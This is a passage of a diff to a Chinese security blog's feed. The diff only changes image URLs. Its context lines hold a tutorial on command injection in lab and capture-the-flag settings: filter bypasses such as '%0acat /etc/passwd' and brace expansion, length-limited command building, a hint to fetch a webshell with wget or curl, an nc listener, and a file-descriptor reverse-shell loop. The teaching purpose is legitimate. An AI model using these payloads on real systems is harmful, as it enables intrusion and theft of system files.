 &lt;/h3>&lt;p>我们可以将PHP中的每个字符串当成一组字符来使用（基本上与 Python 相同），并且我们可以使用&lt;code>$string[2]&lt;/code>或者&lt;code>$string[-3]&lt;/code>语法来引用单个字符。这种方法也有可能绕过基于PHP函数名的防护规则。比如，我们可以使用&lt;code>$a=&amp;quot;eimstdy&amp;quot;;&lt;/code>这个字符串构造出&lt;code>system(&amp;quot;id&amp;quot;);&lt;/code>语句。需要空格的话就在&lt;code>$a&lt;/code>中加入空格就好了。&lt;/p>
 &lt;p>也可以使用一些内置变量，不再赘述，如下图所示&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006073.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006073.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003486.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003486.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="参考">参考
@@ -23239,7 +23239,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里没有对&lt;code>ip&lt;/code>进行输入检测，所以我们可以使用&lt;code>;cmd&lt;/code>的方式进行命令注入。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: medium&lt;/p>
@@ -23310,7 +23310,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仅仅只是增加了&lt;code>&amp;amp;&amp;amp;&lt;/code>与&lt;code>;&lt;/code>两个的过滤。然而我们仍然可以使用&lt;code>|&lt;/code>来进行绕过。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007771.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>####Command Injection: high&lt;/p>
@@ -23395,7 +23395,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里仔细观察，其实&lt;code>|&lt;/code>管道符这里有一个空格，所以我们&lt;code>medium&lt;/code>的&lt;code>payload&lt;/code>还可以继续使用，但是如果真的过滤了&lt;code>|&lt;/code>怎么办呢。我们其实还可以抓包加入&lt;code>%0a&lt;/code>换行符进行一个绕过。使用&lt;code>127.0.0.1 %0acat /etc/passwd&lt;/code>进行绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008189.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="command-injection-impossible">Command Injection: impossible
@@ -23620,14 +23620,14 @@ loading="lazy"
 &lt;li>
 &lt;p>在&lt;code>url&lt;/code>的编码绕过&lt;/p>
 &lt;p>这里我&lt;code>fuzz&lt;/code>了一下，&lt;code>Linux bash&lt;/code>可以使用&lt;code>%20(space)&lt;/code>、&lt;code>%09(tab)&lt;/code>、&lt;code>%3c(&amp;lt;)&lt;/code>以及&lt;code>+&lt;/code>来绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004461.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
 &lt;li>
 &lt;p>花括号拓展&lt;code>{OS_COMMAND,ARGUMENT}&lt;/code>&lt;/p>
 &lt;p>在&lt;code>Linux bash&lt;/code>中还可以使用&lt;code>{cat,/etc/passwd}&lt;/code>来绕过&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009158.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;/li>
@@ -23814,7 +23814,7 @@ loading="lazy"
 &lt;h3 id="举个例子-1">举个例子
 &lt;/h3>&lt;h4 id="短命令执行">短命令执行
 &lt;/h4>&lt;p>首先按照前面的&lt;code>&amp;gt;&lt;/code>的用法，我们可以知道有标准输出可以输出到文件，所以&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007866.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里我们有两种构造方式:&lt;/p>
@@ -23837,13 +23837,13 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;/li>
 &lt;/ol>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008039.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;ol start="2">
 &lt;li>使用&lt;code>\\&lt;/code>，这种方法是利用&lt;code>\&lt;/code>来拼接字符串，其中前一个&lt;code>\&lt;/code>是用来转义后一个&lt;code>\&lt;/code>的。这里需要考虑时间顺序，需要逆序来创建文件。&lt;/li>
 &lt;/ol>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004356.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-1七字绕过">Example 1 七字绕过
@@ -23993,7 +23993,7 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;p>这里需要我们注意的是&lt;code>cmd &amp;lt;= 5&lt;/code>，所以我们就不能在使用&lt;code>ls -t&amp;gt;a&lt;/code>。&lt;/p>
 &lt;p>但是我们还是可以通过比较巧妙的构造来实现&lt;code>ls -t&amp;gt;a&lt;/code>这么一个操作的。可以先通过把&lt;code>ls -t&amp;gt;a&lt;/code>这样拆分成几段写入到&lt;code>_&lt;/code>文件存放。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008919.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>从图中我们就可以看到&lt;code>_&lt;/code>里面的内容，第一行无效命令，2-5行因为末尾有&lt;code>\&lt;/code>连接字符的存在所以可以连接字符串形成&lt;code>ls -t&amp;gt;g&lt;/code>，最后一行执行&lt;code>ls&lt;/code>。所以&lt;code>sh _&lt;/code>我们可以得到当前目录&lt;code>ls -t&amp;gt;g&lt;/code>的效果。达到与&lt;code>Example 1&lt;/code>一致的效果，其他步骤与&lt;code>Example 1&lt;/code>类似，就不再赘述了。下面给出&lt;code>Orange&lt;/code>的&lt;code>exp&lt;/code>&lt;/p>
@@ -24125,27 +24125,27 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这题相比之前又难了一点，这次是&lt;code>cmd &amp;lt;= 4&lt;/code>，但是原理还是一样的。我们要处理的问题还是&lt;code>ls -t&amp;gt;g&lt;/code>这么一个问题。然后因为长度限制，如果我们还用&lt;code>\\&lt;/code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用&lt;code>&amp;gt;&lt;/code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如&lt;code>Exmaple 2&lt;/code>中的&lt;code>&amp;gt;\ \\&lt;/code>这里就不能再使用了。但是我们这里再提一个&lt;code>trick&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007665.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005128.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>*&lt;/code> 相当于&lt;code>$(dir *)&lt;/code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009411.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用&lt;code>*&lt;/code>去执行的话，发现并不可以，因为按照&lt;code>dir&lt;/code>的文件排序，&lt;code>-t&lt;/code>也是排在最前面。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008096.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008096.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000746.jpg"
+&lt;p>所以我们还需要参考一下&lt;code>alphabetical&lt;/code>来排序，这里就不要用&lt;code>Docker&lt;/code>来做了，因为&lt;code>busybox&lt;/code>里面一些东西还是跟真实环境优点区别的。&lt;img src="https://blogpic.zdy.one/img/20190610000746.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以如果我们需要运用&lt;code>-&lt;/code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把&lt;code>-t&lt;/code>置于后面。&lt;/p>
 &lt;p>这里我们可以使用&lt;code>t-&lt;/code>这种逆序的模式把&lt;code>t&lt;/code>放到前面来，就可以比较正常的排序了。&lt;/p>
 &lt;p>逆序的命令我们可以用&lt;code>rev&lt;/code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用&lt;code>dir&lt;/code>来展示当前目录，同时&lt;code>d&lt;/code>字母也比较靠前，不要像&lt;code>ls&lt;/code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造&lt;code>ls -t&amp;gt;g&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008113.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008113.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里可能有几个让大家比较疑惑的地方，比如为什么是&lt;code>&amp;gt;ht-&lt;/code>，个人理解是因为&lt;code>ls&lt;/code>逆序是&lt;code>sl&lt;/code>，&lt;code>s&lt;/code>是排在&lt;code>t&lt;/code>前的，如果不加&lt;code>h&lt;/code>，&lt;code>t-&lt;/code>会在&lt;code>sl&lt;/code>之后，而且&lt;code>ls -th&lt;/code>与&lt;code>ls -t&lt;/code>效果是一样的，然后我们再找一个&lt;code>h&lt;/code>之前的字母做输出文件就可以了。还有一个地方就是&lt;code>*v&amp;gt;x&lt;/code>，之前我们讲过了通配符以及&lt;code>*&lt;/code>的作用，这里&lt;code>*v&lt;/code>就相当于&lt;code>$(dir *v)&amp;gt;x&lt;/code>，&lt;code>dir *v&lt;/code>返回的就是结尾为&lt;code>v&lt;/code>的文件，这里就是&lt;code>rev&lt;/code>与&lt;code>v&lt;/code>两个文件，如果只有相当于先把&lt;code>v&lt;/code>文件内容进行逆序，而后再输入到&lt;code>x&lt;/code>文件，这样整个&lt;code>ls -t&amp;gt;g&lt;/code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接&lt;code>wget&lt;/code>或者&lt;code>curl&lt;/code>一个&lt;code>webshell&lt;/code>到服务器上就好了，就不再赘述了。&lt;/p>
@@ -24268,10 +24268,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这个用起来比较简单，直接去查看对应的记录就好了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005118.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005118.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000939.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000939.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。&lt;/p>
@@ -24298,10 +24298,10 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -l -n -vv -p &lt;span class="m">53&lt;/span> -u -k&lt;span class="o">(&lt;/span>如果不支持-k也可以不用-k&lt;span class="o">)&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004044.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004044.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008182.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008182.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Same:&lt;/p>
@@ -24508,10 +24508,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ cat &amp;lt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span> &lt;span class="nv">$line&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">5&lt;/span> &amp;gt;&lt;span class="p">&amp;amp;&lt;/span>5&lt;span class="p">;&lt;/span> &lt;span class="k">done&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000724.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000724.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003384.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>&lt;code>nc&lt;/code>方式&lt;/p>
